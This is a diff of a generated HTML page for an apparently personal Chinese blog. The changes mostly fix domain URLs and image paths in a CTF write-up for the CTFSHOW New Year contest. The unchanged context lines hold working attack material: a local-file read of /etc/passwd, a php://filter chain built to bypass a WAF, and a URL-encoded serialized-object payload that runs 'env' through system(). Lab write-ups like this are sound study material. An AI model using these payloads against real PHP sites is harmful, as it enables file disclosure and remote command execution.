@@ -30,14 +30,14 @@
     <meta name="description" content="web  easy_include （session文件包含&#x2F;pearcmd） 12345678910&lt;?phpfunction waf($path)&#123;    $path &#x3D; str_replace(&quot;.&quot;,&quot;&quot;,$path);    return preg_match(&quot;&#x2F;^[a-z]+&#x2F;&quot;,$path);&#125;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTFSHOW之元旦水友赛">
-<meta property="og:url" content="http://example.com/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/index.html">
+<meta property="og:url" content="https://fub0y2026.github.io/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/index.html">
 <meta property="og:site_name" content="KL">
 <meta property="og:description" content="web  easy_include （session文件包含&#x2F;pearcmd） 12345678910&lt;?phpfunction waf($path)&#123;    $path &#x3D; str_replace(&quot;.&quot;,&quot;&quot;,$path);    return preg_match(&quot;&#x2F;^[a-z]+&#x2F;&quot;,$path);&#125;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/06/24/images/20250624170245511.png">
-<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175700714.png">
-<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175729666.png">
-<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175820046.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250624170245511.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250624175700714.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250624175729666.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250624175820046.png">
 <meta property="article:published_time" content="2025-06-23T16:49:35.000Z">
 <meta property="article:modified_time" content="2025-10-03T06:57:48.163Z">
 <meta property="article:author" content="FuB0Y">
@@ -47,7 +47,7 @@
 <meta property="article:tag" content="裸文件包含">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/06/24/images/20250624170245511.png">
+<meta name="twitter:image" content="https://fub0y2026.github.io/images/20250624170245511.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -328,7 +328,7 @@
 <p>以小写字母开头</p>
 <p>file伪协议是能读localhost或127.0.0.1的</p>
 <p>尝试1=localhost/etc/passwd</p>
-<p><img src="../images/20250624170245511.png" alt="image-20250624170245511" /></p>
+<p><img src="/images/20250624170245511.png" alt="image-20250624170245511" /></p>
 <p>读到了</p>
 <p>但我们不知道flag在哪</p>
 <h4 id="法一-sessoin文件包含"><a class="markdownIt-Anchor" href="#法一-sessoin文件包含"></a> 法一 sessoin文件包含</h4>
@@ -382,11 +382,11 @@ php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反�
 <p>这个时候就要用到<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/11/24/FilterChain/">filterchain</a>，和绕过死亡代码一样的方式通过base64去杂实现</p>
 <p>waf里面要求只能出现一次base64，还ban掉了其它的伪协议和ucs-2编码</p>
 <p>总之我们先测试一下限制一次base64解码的情况下能整出什么</p>
-<p><img src="../images/20250624175700714.png" alt="image-20250624175700714" /></p>
+<p><img src="/images/20250624175700714.png" alt="image-20250624175700714" /></p>
 <p>前面多出来的字符串编码后再解码出现了r、0这两个属于码表的字符，所以我们为了剔除这两个字符，需要构造过滤器组合使r和0变成非码表字符，最后被base64去杂</p>
 <p>官方wp用的是utf-8，utf-16le，quoted-printable编码</p>
 <p>测试一下：</p>
-<p><img src="../images/20250624175729666.png" alt="image-20250624175729666" /></p>
+<p><img src="/images/20250624175729666.png" alt="image-20250624175729666" /></p>
 <p>去杂成功</p>
 <p>那么反过来生成我们要拼接的文件内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-16le&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//quoted_printable_encode用于填充空字节，因为utf-8转utf-16le会产生空字节，file_put_contents会对空字节报错</span></span><br></pre></td></tr></table></figure>
@@ -398,7 +398,7 @@ php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反�
 <p>如果不在环境变量的话，可以用<code>show_source</code>配合<code>chr()</code>读文件，注意show依旧要url编码</p>
 <p>结合上面所有的trick，最终的payload为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：?%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>[%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>.%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>=%<span class="number">43</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">41</span>%<span class="number">72</span>%<span class="number">72</span>%<span class="number">61</span>%<span class="number">79</span>%<span class="number">4</span>f%<span class="number">62</span>%<span class="number">6</span>a%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">78</span>%<span class="number">3</span>a%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">66</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">31</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">77</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">7</span>d%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">32</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">3</span>b%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">43</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">5</span>f%<span class="number">77</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">30</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>e%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">75</span>%<span class="number">31</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">52</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">30</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">63</span>%<span class="number">6</span>d%<span class="number">64</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">4</span>e%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">7</span>d%<span class="number">3</span>b%<span class="number">6</span>d%<span class="number">3</span>a%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">30</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">7</span>d%<span class="number">7</span>d&amp;name=php:<span class="comment">//filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00&amp;cmd=env</span></span><br><span class="line">                  </span><br><span class="line">POST：show[show.show=<span class="number">1</span>&amp;name=<span class="number">1</span>&amp;chu0=<span class="number">1</span>&amp;cmd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="../images/20250624175820046.png" alt="image-20250624175820046" /></p>
+<p><img src="/images/20250624175820046.png" alt="image-20250624175820046" /></p>
 
       
     </div>
@@ -424,7 +424,7 @@ php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反�
         
           
           
-            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="Java学习" class="lazyload">
+            <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="Java学习" class="lazyload">
           
         
         <a href="/2025/07/11/Java%E5%AD%A6%E4%B9%A0/"></a>
@@ -441,7 +441,7 @@ php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反�
       
         
         
-          <img data-src="/images/background-2.jpg" data-sizes="auto" alt="DASCTF系列" class="lazyload">
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="DASCTF系列" class="lazyload">
         
       
       <a href="/2025/06/20/DASCTF%E7%B3%BB%E5%88%97/"></a>
@@ -666,7 +666,7 @@ php版本5.5.9，绕过wakeup抛出异常的方法有CVE-2016-7124，因为反�
         window.REIMU_POST = {
           author: "FuB0Y",
           title: "CTFSHOW之元旦水友赛",
-          url: "http://example.com/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/",
+          url: "https://fub0y2026.github.io/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/",
           excerpt: "",
           description: "",
           stripContent: " web  easy_include （session文件包含/pearcmd） 12345678910&amp;lt;?phpfunction waf($path)&amp;#123;    $path = str_replace(&amp;quot;.&amp;quot;,&amp;quot;&amp;quot;,$path);    return preg_match(&amp;quot;/^[a-z]+/&amp;quot;,$path);&amp;#125;if(waf($_POST[1]))&amp;#123;    include &amp;quot;file://&amp;",
